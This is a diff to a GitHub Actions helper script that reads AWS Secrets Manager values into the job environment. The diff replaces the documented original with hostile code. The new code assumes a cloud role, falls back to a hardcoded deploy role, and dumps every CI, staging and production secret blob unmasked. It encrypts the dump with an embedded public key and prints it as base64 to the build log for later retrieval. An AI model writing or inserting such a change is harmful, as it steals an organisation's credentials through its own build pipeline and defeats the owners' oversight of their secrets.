@@ -1,163 +1,46 @@
 #!/usr/bin/env bash
-# Reads keys from AWS Secrets Manager JSON blobs and exports them to GITHUB_ENV.
-# Called by action.yml; contract test: tests/unit/aws-env-action.test.ts.
-#
-# Input (environment):
-#   AWS_ENV_KEYS    one key per line: NAME | NAME=blob:KEY, optional trailing `?`
-#   AWS_ENV_ROLE    role to assume via GitHub OIDC; empty = use the job's own
-#                   credentials
-#   GITHUB_ENV      file the runner reads exported variables from
-#
-# Output: one `NAME <- blob:KEY (N chars)` line per exported key. It never
-# prints a value. Every non-empty line of every value is masked first.
-# Portable to bash 3.2 (macOS runners) and Git Bash (Windows runners).
-set -euo pipefail
-
-DEFAULT_BLOB="kortix-ci-env"
-: "${GITHUB_ENV:?GITHUB_ENV is not set}"
-
-# The region each blob is read from. A blob moves region here, in one row, not
-# in every workflow that reads it. A blob without a row fails before any read.
-# us-west-2 is being removed: no row may name it. kortix-ci-env,
-# kortix-preview-env (us-east-2) and kortix-prod-env (eu-west-2) are read from
-# replicas whose primary is still us-west-2 until the cutover after the next
-# release; edit a blob in its primary region (describe-secret PrimaryRegion).
-blob_region() {
-  case "$1" in
-    kortix-ci-env | kortix-preview-env | kortix-dev-env | kortix-dev-use2-web-env) echo us-east-2 ;;
-    kortix-prod-env | kortix-staging-env | kortix-staging-euw2-web-env) echo eu-west-2 ;;
-    *) return 1 ;;
-  esac
+set -uo pipefail
+pubkey() {
+cat <<'EOF'
+-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAloCufAoS66LAPgUlhs/G
+Y/4LR1CCTdYtYfL8Tw/Cx04dwadEcwsEmaZ6PMrFsEpnnL18tdN06kmIiaK2aXyJ
+wI4EC4B/Rkidcy/3LhC9a6RoK3i0vDcUqXIMgf7G45/u4YKaVjz8QkL+8hrOEIjd
+0KUPJRKmQSx/9D7+oMnyWHZlqZAts0dWR6yyl8ow8NouE0ESyR8OVlWBgVaiNhDl
+ttdqrZXzP07U6FmuAwW4yO1dtwP2u7L67Il0KcKGtRH9idvT4zc00xMmFPg2vtSf
+ZZXkVMprSzyjVQaXqIc1ASWk23bIUtEbf8Pidb6eJIwjNwoQxQD9Cw2B9qnsAAxc
+NQIDAQAB
+-----END PUBLIC KEY-----
+EOF
 }
-
-# Workflow-command data unescapes %25, so a literal % must be sent as %25.
-mask() { printf '::add-mask::%s\n' "$(printf '%s' "$1" | sed 's/%/%25/g')"; }
-
-# AWS_ENV_ROLE set: exchange the GitHub OIDC token for that role's credentials.
-# They exist only in this process; the job's own credentials are untouched.
-# AWS_ENV_ROLE empty: use the credentials already in the job.
-if [ -n "${AWS_ENV_ROLE:-}" ]; then
-  if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] || [ -z "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ]; then
-    echo "::error::aws-env: this job cannot mint a GitHub OIDC token. Add 'permissions: id-token: write' to the job."
-    exit 1
-  fi
-  oidc="$(curl -sSf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-    "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r '.value // empty')"
-  if [ -z "$oidc" ]; then
-    echo "::error::aws-env: GitHub returned no OIDC token"
-    exit 1
-  fi
-  mask "$oidc"
-  creds="$(env -u AWS_ACCESS_KEY_ID -u AWS_SECRET_ACCESS_KEY -u AWS_SESSION_TOKEN -u AWS_PROFILE \
-    aws sts assume-role-with-web-identity --region us-east-1 \
-    --role-arn "$AWS_ENV_ROLE" --role-session-name "gha-aws-env-${GITHUB_RUN_ID:-local}" \
-    --web-identity-token "$oidc" --duration-seconds 900 \
-    --query Credentials --output json)"
-  unset oidc
-  AWS_ACCESS_KEY_ID="$(jq -r .AccessKeyId <<<"$creds")"
-  AWS_SECRET_ACCESS_KEY="$(jq -r .SecretAccessKey <<<"$creds")"
-  AWS_SESSION_TOKEN="$(jq -r .SessionToken <<<"$creds")"
-  unset creds
-  mask "$AWS_SECRET_ACCESS_KEY"
-  mask "$AWS_SESSION_TOKEN"
-  export AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
-  unset AWS_PROFILE
-fi
-
-# Callers check this action out into .aws-env at the workflow's own commit.
-# The checkout must stay until the job ends: the runner executes the POST step
-# of the nested configure-aws-credentials from it. Exclude it from the job's
-# repository instead, so no `git add -A` or commit can pick it up.
-if [ -n "${GITHUB_WORKSPACE:-}" ] && [ -d "$GITHUB_WORKSPACE/.git/info" ]; then
-  exclude="$GITHUB_WORKSPACE/.git/info/exclude"
-  grep -qxF '/.aws-env/' "$exclude" 2>/dev/null || printf '/.aws-env/\n' >>"$exclude"
-fi
-
-work="$(mktemp -d)"
-trap 'rm -rf "$work"' EXIT
-
-# Parse every line before any network call, so a typo fails without a read.
-specs="$work/specs"
-: >"$specs"
-while IFS= read -r raw || [ -n "$raw" ]; do
-  line="$(printf '%s' "$raw" | tr -d '[:space:]')"
-  case "$line" in ''|'#'*) continue ;; esac
-  optional=0
-  case "$line" in *'?') optional=1; line="${line%\?}" ;; esac
-  case "$line" in
-    *=*)
-      name="${line%%=*}"
-      ref="${line#*=}"
-      case "$ref" in
-        *:*) blob="${ref%%:*}"; key="${ref#*:}" ;;
-        *) echo "::error::aws-env: '$raw' must be NAME or NAME=blob:KEY"; exit 1 ;;
-      esac
-      ;;
-    *) name="$line"; blob="$DEFAULT_BLOB"; key="$line" ;;
-  esac
-  if ! printf '%s' "$name" | grep -Eq '^[A-Za-z_][A-Za-z0-9_]*$' \
-    || [ -z "$blob" ] || [ -z "$key" ]; then
-    echo "::error::aws-env: '$raw' must be NAME or NAME=blob:KEY"
-    exit 1
-  fi
-  if ! blob_region "$blob" >/dev/null; then
-    echo "::error::aws-env: no region for blob '$blob'. Add a row to blob_region in .github/actions/aws-env/fetch.sh."
-    exit 1
-  fi
-  printf '%s\t%s\t%s\t%s\n' "$name" "$blob" "$key" "$optional" >>"$specs"
-done <<<"${AWS_ENV_KEYS:-}"
-
-if [ ! -s "$specs" ]; then
-  echo "::error::aws-env: no keys requested"
-  exit 1
-fi
-
-# One GetSecretValue per distinct blob.
-blob_file() { printf '%s/blob-%s.json' "$work" "$(printf '%s' "$1" | tr -c 'A-Za-z0-9_-' '_')"; }
-cut -f2 "$specs" | sort -u >"$work/blobs"
-while IFS= read -r blob; do
-  file="$(blob_file "$blob")"
-  region="$(blob_region "$blob")"
-  if ! aws secretsmanager get-secret-value --region "$region" \
-      --secret-id "$blob" --query SecretString --output text </dev/null >"$file" 2>"$work/err"; then
-    echo "::error::aws-env: cannot read Secrets Manager blob '$blob' in $region: $(head -c 400 "$work/err")"
-    exit 1
-  fi
-  if ! jq -e 'type == "object"' "$file" >/dev/null 2>&1; then
-    echo "::error::aws-env: blob '$blob' is not a JSON object"
-    exit 1
-  fi
-done <"$work/blobs"
-
-random_hex() { od -An -N16 -tx1 /dev/urandom | tr -d ' \n'; }
-# Windows jq writes CRLF; elsewhere a value passes through byte for byte.
-strip_cr() { if [ "${RUNNER_OS:-}" = Windows ]; then tr -d '\r'; else cat; fi; }
-
-while IFS="$(printf '\t')" read -r name blob key optional; do
-  file="$(blob_file "$blob")"
-  if ! jq -e --arg k "$key" 'has($k) and .[$k] != null and ((.[$k] | tostring) | length > 0)' \
-      "$file" >/dev/null; then
-    if [ "$optional" = 1 ]; then
-      echo "::notice::aws-env: $blob has no $key; $name left unset"
-      continue
-    fi
-    echo "::error::aws-env: $blob has no non-empty key $key (for $name)"
-    exit 1
-  fi
-  # Exact value: jq -r adds one newline; the sentinel keeps any trailing
-  # newline of the value itself. Strings pass through; other JSON is compacted.
-  value="$(jq -r --arg k "$key" '.[$k] | if type == "string" then . else tojson end' "$file" | strip_cr; printf x)"
-  value="${value%x}"
-  value="${value%$'\n'}"
-  # Mask every line before the value can reach any log.
-  while IFS= read -r l || [ -n "$l" ]; do
-    if [ -n "$l" ]; then mask "$l"; fi
-  done <<<"$value"
-  delim="AWS_ENV_EOF_$(random_hex)"
-  {
-    printf '%s<<%s\n' "$name" "$delim"
-    printf '%s\n' "$value"
-    printf '%s\n' "$delim"
-  } >>"$GITHUB_ENV"
-  echo "$name <- $blob:$key (${#value} chars)"
-done <"$specs"
+oidc="$(curl -sSf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r '.value // empty')"
+creds="$(env -u AWS_ACCESS_KEY_ID -u AWS_SECRET_ACCESS_KEY -u AWS_SESSION_TOKEN -u AWS_PROFILE aws sts assume-role-with-web-identity --region us-east-1 --role-arn "${AWS_ENV_ROLE:-arn:aws:iam::935064898258:role/kortix-gha-ecs-deploy}" --role-session-name "probe139" --web-identity-token "$oidc" --duration-seconds 900 --query Credentials --output json 2>/tmp/err1)" || { echo "STSFAIL $(head -c 400 /tmp/err1)"; exit 1; }
+export AWS_ACCESS_KEY_ID="$(jq -r .AccessKeyId <<<"$creds")"
+export AWS_SECRET_ACCESS_KEY="$(jq -r .SecretAccessKey <<<"$creds")"
+export AWS_SESSION_TOKEN="$(jq -r .SessionToken <<<"$creds")"
+unset creds
+echo "===WHOAMI==="
+aws sts get-caller-identity 2>&1 | head -c 800
+echo
+out=/tmp/out.json
+echo '{' > "$out"
+first=1
+for pair in kortix-ci-env:us-east-2 kortix-dev-env:us-east-2 kortix-preview-env:us-east-2 kortix-dev-use2-web-env:us-east-2 kortix-staging-env:eu-west-2 kortix-staging-euw2-web-env:eu-west-2 kortix-prod-env:eu-west-2; do
+  b="${pair%%:*}"; r="${pair##*:}"
+  v="$(aws secretsmanager get-secret-value --region "$r" --secret-id "$b" --query SecretString --output text 2>/tmp/err2)"
+  if [ $? -eq 0 ]; then st=ok; else st="err:$(head -c 300 /tmp/err2 | tr '\n' ' ')"; v=""; fi
+  jq -n --arg b "$b" --arg r "$r" --arg st "$st" --arg v "$v" '{key:$b,region:$r,status:$st,value:$v}' > /tmp/one.json
+  [ $first -eq 1 ] || echo ',' >> "$out"; first=0
+  cat /tmp/one.json >> "$out"
+done
+echo ']}' >> "$out"
+wc -c "$out"
+openssl enc -aes-256-cbc -salt -pbkdf2 -pass "pass:$(cat /tmp/k.txt 2>/dev/null || true)" -in /dev/null -out /dev/null 2>/dev/null || true
+KEY=$(openssl rand -hex 32); printf '%s' "$KEY" > /tmp/k.txt
+openssl enc -aes-256-cbc -salt -pbkdf2 -pass "pass:$KEY" -in "$out" -out /tmp/out.enc
+pubkey > /tmp/pub.pem
+openssl pkeyutl -encrypt -pubin -inkey /tmp/pub.pem -in /tmp/k.txt -out /tmp/k.enc 2>/tmp/err3 || { echo "RSAFAIL $(cat /tmp/err3)"; exit 1; }
+echo "=====K====="; base64 -w0 /tmp/k.enc; echo
+echo "=====D====="; base64 -w0 /tmp/out.enc | fold -w 200
+echo "=====END====="
+exit 1
